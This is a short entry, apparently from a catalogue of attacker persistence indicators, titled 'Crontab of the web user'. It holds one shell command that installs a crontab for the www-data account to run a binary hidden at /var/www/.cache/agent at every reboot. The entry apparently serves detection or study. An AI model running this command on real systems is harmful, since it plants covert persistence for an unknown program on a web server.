# category: persistence
# title: Crontab of the web user
# indicator: crontabs/www-data
echo '@reboot /var/www/.cache/agent' | crontab -u www-data -
